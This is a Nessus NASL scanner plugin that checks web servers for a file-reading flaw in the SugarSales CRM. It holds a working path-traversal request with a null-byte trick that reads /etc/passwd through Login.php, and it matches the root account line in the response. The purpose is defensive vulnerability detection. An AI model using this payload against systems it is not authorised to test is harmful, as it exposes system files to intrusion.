#
# (C) Tenable Network Security
#
if(description)
{
 script_id(15950);
 script_bugtraq_id(11896); 
 script_version("$Revision: 1.3 $");
 name["english"] = "SugarSales Remote File Access";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running SugarSales, a customer relationship suite written
in Java and PHP.

The remote version of this software is vulnerable to a vulnerability
which may allow an attacker to read arbitary files on the remote host with
the privileges of the httpd user.

Solution : Upgrade to the newest version of this software
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for a file reading flaw in SugarSales";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir ( cgi_dirs() )
{
 req = http_get(port:port, item:dir + "/sugarcrm/modules/Users/Login.php?theme=../../../../../../../etc/passwd%00");
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( egrep(pattern:"root:.*:0:[01]:.*:.*:", string:res) )
 {
	 security_hole(port);
	 exit(0);
 }
}
